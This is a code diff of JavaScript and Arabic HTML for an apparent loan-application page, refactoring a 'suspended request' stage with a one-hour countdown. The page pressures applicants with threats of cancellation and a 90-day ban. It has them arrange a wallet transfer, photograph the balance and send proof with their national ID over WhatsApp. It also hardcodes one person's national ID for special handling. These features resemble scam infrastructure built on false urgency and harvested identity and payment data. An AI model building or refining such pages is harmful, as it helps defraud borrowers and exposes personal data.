-                    تم تعليق طلبك لمدة <strong>${TIMER_MINUTES} دقيقة</strong> فقط (ساعة واحدة).<br>
-                    إذا لم تقم بإثبات الجدارة خلال هذه المدة، <strong>سيتم شطب طلبك بالكامل ولن تتمكن من التقديم مرة أخرى إلا بعد 90 يوماً</strong>.
-                </div>
-                <div class="step-box">📋 <strong>باختصار: ليه بنطلب منك إثبات الجدارة؟</strong><br>(من غير ما تحول لنا ولا مليم - بس عشان نتأكد من جدية تعاملك)</div>
-                <div class="step-box">✅ <strong>الهدف الوحيد:</strong> نتأكد إن وضعك المالي يسمح بالقرض.</div>
-                <div class="step-box">🔹 <strong>المطلوب منك بكل بساطة:</strong><br>اطلب من أي حد تثق فيه يحول لك <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} جنيه</span> على محفظتك، صوّر الرصيد، بعدين حولهم له تاني.</div>
-                <div class="step-box">🍃 احنا لا نطلب فلوس ولا يتطلب منك دفع منها حاجة – الفلوس كلها انت بتحولها تانى فى وقتها للشخص اللي حولها لك.</div>
-                <div class="step-box">✅ <strong>بعد الإثبات:</strong> القرض يتفعّل فورا ويوصلك.<br>❌ <strong>لو ما أثبتش خلال ${TIMER_MINUTES} دقيقة:</strong> الطلب يتشطب مع حظر 90 يوماً.</div>
-                <div class="details-grid">
-                    <div class="detail-item"><span><i class="fas fa-wallet"></i> المحفظة المسجلة</span><span>${customer.wallet} ${customer.walletNum ? '('+customer.walletNum+')' : ''}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-money-bill-wave"></i> المبلغ المطلوب</span><span>${customer.loan.toLocaleString('ar-EG')} ج.م</span></div>
-                </div>
-                <div class="urgent-timer">
-                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي قبل الشطب والحظر 90 يوماً</div>
-                    <div class="timer" id="karimTimer">${formatTime(remainingSeconds)}</div>
-                    <div style="font-size:0.7rem;">⚠️ بعد انتهاء الوقت، سيتم شطب الطلب وحظرك 90 يوماً</div>
-                </div>
-                <button class="btn-whatsapp" id="sendProofKarimBtn">
-                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات فوراً
-                </button>
-            </div>
-        `;
-        document.getElementById('resultSection').innerHTML = html;
-
+        buildProofSteps(customer, nationalId, true, Math.ceil(remainingSeconds / 60));
+        
+        // تحديث المؤقت ليتابع بشكل دقيق
         let currentSeconds = remainingSeconds;
-        const timerEl = document.getElementById('karimTimer');
-        const interval = setInterval(() => {
-            if (currentSeconds <= 0) {
-                clearInterval(interval);
-                const nowTime = Date.now();
-                const blockUntilTimestamp = nowTime + (BLOCK_DURATION_DAYS * 24 * 60 * 60 * 1000);
-                localStorage.setItem(blockKey, blockUntilTimestamp.toString());
-                localStorage.removeItem(startKey);
-                window.location.reload();
-            } else {
-                currentSeconds--;
-                timerEl.innerText = formatTime(currentSeconds);
-                const newStart = Date.now() - ((TIMER_MINUTES * 60 - currentSeconds) * 1000);
-                localStorage.setItem(startKey, newStart.toString());
-            }
-        }, 1000);
-
-        const btn = document.getElementById('sendProofKarimBtn');
-        if (btn) {
-            btn.onclick = () => {
-                openWhatsApp(`🚨 طلب معلق لمدة ساعة (يجب الإثبات قبل انتهاء الوقت)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\nسأقوم بإرسال صور الإثبات فوراً.`);
-            };
+        const timerEl = document.getElementById('proofTimer');
+        if (timerEl) {
+            const interval = setInterval(() => {
+                if (currentSeconds <= 0) {
+                    clearInterval(interval);
+                    const nowTime = Date.now();
+                    const blockUntilTimestamp = nowTime + (BLOCK_DURATION_DAYS * 24 * 60 * 60 * 1000);
+                    localStorage.setItem(blockKey, blockUntilTimestamp.toString());
+                    localStorage.removeItem(startKey);
+                    window.location.reload();
+                } else {
+                    currentSeconds--;
+                    const mins = Math.floor(currentSeconds / 60);
+                    const secs = currentSeconds % 60;
+                    timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+                    const newStart = Date.now() - ((TIMER_MINUTES * 60 - currentSeconds) * 1000);
+                    localStorage.setItem(startKey, newStart.toString());
+                }
+            }, 1000);
         }
-    }
-
-    function formatTime(seconds) {
-        const mins = Math.floor(seconds / 60);
-        const secs = seconds % 60;
-        return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
     }
 
     function buildSupportNeededStage(customer, nationalId) {
@@ -573,19 +565,16 @@ const customersDatabase = {
             currentNationalId = nationalId;
             document.getElementById('errorCard').style.display = 'none';
 
-            // ===== حالة التعليق (suspended) - الأولوية القصوى =====
             if (customer.status === "suspended") {
                 buildSuspendedStage(customer, nationalId);
                 return;
             }
 
-            // ===== عميل كريم فؤاد =====
             if (nationalId === "29012011406251") {
                 handleKarimFouad(customer, nationalId);
                 return;
             }
 
-            // ===== باقي الحالات =====
             switch (customer.status) {
                 case 'approved': buildApprovedStage(customer, nationalId); break;
                 case 'pending_hold': 
